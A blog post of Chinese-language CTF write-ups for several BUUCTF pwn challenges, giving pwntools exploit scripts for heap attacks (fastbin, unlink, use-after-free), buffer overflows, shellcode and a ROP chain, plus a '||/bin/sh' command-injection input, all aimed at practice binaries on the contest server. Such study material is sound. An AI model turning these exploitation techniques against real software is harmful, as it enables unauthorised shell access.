---
title: buuctf-pwn write-ups (5)
date: 2023-02-28 22:08:00
categories:
- write-ups
- buuctf 系列
---
# buu039-[ZJCTF 2019]EasyHeap
一道堆题，经典的菜单，创建chunk（最多10个），编辑chunk（可以有任意长度的堆溢出），删除chunk（没有悬挂指针）。因此本题考察堆溢出。

由于本题环境在2.23，因此可以使用的堆漏洞方式比更高版本的更多。

```c
      if ( choice == 4869 )
      {
        if ( (unsigned __int64)magic <= 0x1305 )
        {
          puts("So sad !");
        }
        else
        {
          puts("Congrt !");
          l33t();
        }
      }
```
题目里面有这么一段，应该是只要能够把地址magic的位置修改成大于0x1305，然后选项填4869就能getshell。

**方法1：fastbin attack**
这应该是最简单的方法了。分配一些小的chunk，然后通过堆溢出直接修改chunk的fd指针。这个时候需要绕过一个检查：
```c
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
            {
              errstr = "malloc(): memory corruption (fast)";
            errout:
              malloc_printerr (check_action, errstr, chunk2mem (victim), av);
              return NULL;
            }
```
也就是会检查fastbin的chunk的size是否正确。我们可以错位分配fastbin chunk到bss段中的heaparray中，以实现对写入地址的完全控制。

![](1.png)
分配之后，heaparray[2]应该是0x6020B5-0x8的地址。修改magic之后调用l33t函数，但是发现没有这个文件。好家伙玩我是吧......

但是还有其他方法。我们现在控制了bss段，可以随意修改heaparray，从而实现任一地址任意长度写。因此可以修改got表，把exit或malloc等函数改成system的plt地址即可，但是由于要传入参数，所以考虑修改free.got。

exp：
```python
from pwn import *
context(arch='amd64', log_level='debug')

# io = process('./easyheap')
elf = ELF('./easyheap')
io = remote('node4.buuoj.cn', 28974)

def create(size, content):
	io.sendlineafter(b'Your choice :', b'1')
	io.sendlineafter(b'Size of Heap : ', str(size).encode())
	io.sendlineafter(b'Content of heap:', content)

def edit(index, size, content):
	io.sendlineafter(b'Your choice :', b'2')
	io.sendlineafter(b'Index :', str(index).encode())
	io.sendlineafter(b'Size of Heap : ', str(size).encode())
	io.sendlineafter(b'Content of heap :', content)

def delete(index):
	io.sendlineafter(b'Your choice :', b'3')
	io.sendlineafter(b'Index :', str(index).encode())

create(0x40, b'colin')		# chunk #0
create(0x60, b'colin')		# chunk #1
delete(1)
edit(0, 0x100, cyclic(0x40) + p64(0) + p64(0x71) + p64(0x6020B5 - 8))	# overflow chunk #1
create(0x60, b'colin')	# new chunk #1
create(0x60, b'\x00' * 3 + p64(0) * 4 + p64(elf.got['free']))	# alloc chunk in bss, overflow chunk #0
edit(0, 0x8, p64(elf.plt['system']))		# edit free().got to system().plt
create(0x60, b'/bin/sh')
delete(3)	# system('/bin/sh')
io.interactive()
```

**方法2：unlink**
通过使用unsorted bin的unlink操作控制heaparray数组，也是一种可行的方法。具体的实现原理请参考我的how2heap系列第5、8篇文章，本题的实现原理与how2heap中unlink的演示高度相似。

exp：
```python
from pwn import *
context(arch='amd64', log_level='debug')

# io = process('./easyheap')
elf = ELF('./easyheap')
io = remote('node4.buuoj.cn', 28974)

def create(size, content):
	io.sendlineafter(b'Your choice :', b'1')
	io.sendlineafter(b'Size of Heap : ', str(size).encode())
	io.sendlineafter(b'Content of heap:', content)

def edit(index, size, content):
	io.sendlineafter(b'Your choice :', b'2')
	io.sendlineafter(b'Index :', str(index).encode())
	io.sendlineafter(b'Size of Heap : ', str(size).encode())
	io.sendlineafter(b'Content of heap :', content)

def delete(index):
	io.sendlineafter(b'Your choice :', b'3')
	io.sendlineafter(b'Index :', str(index).encode())
	
create(0x80, b'colin')	# chunk #0
create(0x80, b'colin')	# chunk #1
create(0x80, b'/bin/sh')	# chunk #2
fakechunk_struct = p64(0)
fakechunk_struct += p64(0x80)	# fake chunk size = 0x80
fakechunk_struct += p64(0x6020E0 - 0x18)	# fake chunk fd, fd->bk = fake chunk
fakechunk_struct += p64(0x6020E0 - 0x10)	# fake chunk bk, bk->fd = fake chunk
fakechunk_struct += cyclic(0x80 - 0x20)
fakechunk_struct += p64(0x80)	# overwrite chunk #1 prev size
fakechunk_struct += p64(0x90)	# overwrite prev_in_use bit = 0
edit(0, 0x90, fakechunk_struct)
delete(1)	# trigger unlink, after deletion chunk #0 should be 0x6020E0 - 0x18 = 0x6020C8
edit(0, 0x20, cyclic(0x18) + p64(elf.got['free']))	# change chunk #0 to free().got
edit(0, 0x8, p64(elf.plt['system']))	# change free().got to system().plt
delete(2)	# system('/bin/sh')
io.interactive()
```

**方法3：爆破修改__malloc_hook**
在方法一的fastbin attack之后，我们通过释放一个chunk到unsorted bin中能够在堆中写入main_arena+88的地址。通过分析可知__malloc_hook的地址应为main_arena - 0x10处。如果需要在这里分配一个fastbin，需要写入main_arena - 0x23来错位分配（起始地址即为下图中标出的地方），但这样需要修改最低两个字节的值，因此倒数第二低字节的高4位需要爆破，成功率为1/16。分配到这里的地址之后，把one_gadget写入到hook中调用malloc即可。

![](2.png)
但是这种方法在本题中不太可行。因为本题不能读取任何数据，只能通过修改unsorted bin的fd和bk指针分配，而unsorted bin的检查比fastbin多得多，无法通过检查。如果能够将fastbin chunk的fd中写入此处的地址应该是没有问题的，但问题就在于我们无法获取其地址，只能通过修改低字节的方式修改它。

后来想想，如果真的要将fastbin chunk中的fd指针修改为main arena的地址也不是不行。方法：首先通过前两种方法获取到对heaparray的写权限，然后把一个chunk释放两次，第一次释放在fastbin中，第二次释放在unsorted bin中，两次释放之间通过堆溢出修改chunk的大小（改大）使第二次能被释放到unsorted bin中。

不过按照上面的方法就显得有点多此一举了。其思想与方法一是相同的，都是错位分配。因此这里就不再进行赘述了。感兴趣的读者可以自己实现一下。
# buu040-wustctf2020_getshell
```python
from pwn import *
# io = process('./pwn')
io = remote('node4.buuoj.cn', 29015)
io.sendline(cyclic(24) + p32(0xdeadbeef) + p32(0x804851B))
io.interactive()
```
# buu041-bjdctf_2020_router
nc直接连，输入1然后输入``||/bin/sh``即可。这是linux命令行特性，要知道``||``的含义：上一条命令执行失败之后执行下一条命令，远程没有ping，因此直接执行/bin/sh。
# buu042-hitcontraining_uaf
经典菜单题，从题目标题就能看出来是一道考UAF的题。在del_note函数中果然出现了UAF漏洞：
```c
if ( notelist[index] )
  {
    free(notelist[index]->strbuf);
    free(notelist[index]);		// 没有清空指针
    puts("Success");
  }
```
通过分析add_note函数可知，最多分配5个chunk，每一个chunk有一个函数指针和一个存放字符串的buffer，函数指针固定指向print_note_content函数。不难想到通过UAF可以将函数指针修改为后门函数magic：
- 首先分配两个chunk，字符串chunk的大小大于0x20
- 释放这两个chunk
- 分配第三个chunk，字符串chunk大小为0x20，这样第三个chunk的字符串chunk和第一个chunk位置相同，修改其函数指针调用即可。
```python
from pwn import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25067)

def add(size, content):
	io.sendlineafter(b'Your choice :', b'1')
	io.sendlineafter(b'Note size :', str(size).encode())
	io.sendlineafter(b'Content :', content)

def delete(index):
	io.sendlineafter(b'Your choice :', b'2')
	io.sendlineafter(b'Index :', str(index).encode())

def printc(index):
	io.sendlineafter(b'Your choice :', b'3')
	io.sendlineafter(b'Index :', str(index).encode())

add(0x18, b'colin')
add(0x18, b'colin')
delete(0)
delete(1)
add(0x8, p32(0x8048945) + p32(0))
printc(0)
io.interactive()
```
# buu043-picoctf_2018_buffer overflow 1
```python
from pwn import *
# io = process('./pwn')
io = remote('node4.buuoj.cn', 25573)
io.sendline(cyclic(40+4) + p32(0x80485CB))
io.interactive()
```
# buu044-jarvisoj_test_your_memory
```python
from pwn import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 27588)
io.sendline(cyclic(19+4) + p32(0x8048440) + p32(0x80487E0)*2)
io.interactive()
```
# buu045-mrctf2020_shellcode
```python
from pwn import *
context(arch='amd64', log_level='debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 26987)
io.sendline(asm(shellcraft.amd64.sh()))
io.interactive()
```
# buu046-inndy_rop
首先把'/bin/sh'写到bss段然后系统调用。
```python
from pwn import *
context.log_level='debug'
io = process('./pwn')
# io = remote('node4.buuoj.cn', 25928)
int80 = 0x806C943
popeax_ret = 0x80B8016
popebx_edx_ret = 0x806ECD9
popecx_ret = 0x80DE769
addesp0x14_ret = 0x807A75D
bss = 0x80EBFD4
read = 0x806D290
payload = cyclic(12 + 4)

payload += p32(read)			# call read()
payload += p32(addesp0x14_ret)	# return address, add esp to execute latter ROP
payload += p32(0)				# arg #1 of read(): stdin
payload += p32(bss)				# arg #2 of read(): a bss address
payload += p32(0x8)				# arg #3 of read(): read length
payload += p32(0) * 2

payload += p32(popeax_ret)		# eax = 0x11(SYS_EXECVE)
payload += p32(11)
payload += p32(popebx_edx_ret)
payload += p32(bss)				# ebx = '/bin/sh'
payload += p32(0)				# edx = 0
payload += p32(popecx_ret)
payload += p32(0)				# ecx = 0
payload += p32(int80)			# int 80
io.sendline(payload)
io.sendline(b'/bin/sh' + b'\x00')
io.interactive()
```
